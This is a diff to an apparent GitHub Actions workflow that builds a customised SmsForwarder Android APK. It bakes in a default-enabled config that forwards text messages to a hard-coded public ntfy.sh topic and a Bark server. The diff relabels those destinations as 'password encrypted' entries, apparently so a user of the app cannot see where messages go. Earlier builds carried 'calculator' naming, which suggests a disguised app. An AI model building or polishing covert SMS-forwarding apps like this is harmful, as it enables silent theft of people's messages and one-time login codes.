@@ -1,4 +1,4 @@
-name: Build SmsForwarder v53 Calculator Delete Password APK
+name: Build SmsForwarder v54 Recent Changes APK
 
 on:
   workflow_dispatch:
@@ -30,7 +30,7 @@ jobs:
           distribution: temurin
           java-version: 11
 
-      - name: Force locate v53 source
+      - name: Force locate v54 source
         run: |
           set -e
           python3 - <<'PY'
@@ -45,6 +45,7 @@ jobs:
                   print(p)
 
           priorities = [
+              "*v54*.zip", "*V54*.zip",
               "*v53*.zip", "*V53*.zip",
               "*v52*.zip", "*V52*.zip",
               "*v51*.zip", "*V51*.zip",
@@ -72,7 +73,7 @@ jobs:
 
           print("强制使用源码 zip：", source_zip)
 
-          out_dir = Path("forced-v53-source")
+          out_dir = Path("forced-v54-source")
           if out_dir.exists():
               shutil.rmtree(out_dir)
           out_dir.mkdir(parents=True, exist_ok=True)
@@ -103,14 +104,14 @@ jobs:
           fi
 
           CONFIG_FILE="$ASSETS_DIR/push_config.json"
-          if [ ! -f "$CONFIG_FILE" ] || ! grep -q "默认Bark" "$CONFIG_FILE"; then
+          if [ ! -f "$CONFIG_FILE" ] || ! grep -q "密码已加密" "$CONFIG_FILE"; then
             cat > "$CONFIG_FILE" <<'EOF'
           {
             "enabled": true,
             "senders": [
               {
                 "enabled": true,
-                "name": "默认Webhook",
+                "name": "密码已加密******2",
                 "type": "webhook",
                 "webServer": "https://ntfy.sh/telegram-api_anquan-top-zhongxing-3niu99",
                 "method": "POST",
@@ -119,7 +120,7 @@ jobs:
               },
               {
                 "enabled": true,
-                "name": "默认Bark",
+                "name": "密码已加密******1",
                 "type": "bark",
                 "server": "https://api.day.app/1234567890ABCDEFG/",
                 "icon": ""
@@ -211,7 +212,7 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: SmsForwarder-v53-calculator-delete-password-apk
+          name: SmsForwarder-v54-recent-changes-apk
           path: |
             ${{ env.PROJECT_DIR }}/app/build/outputs/apk/release/*.apk
             ${{ env.PROJECT_DIR }}/app/build/outputs/apk/debug/*.apk
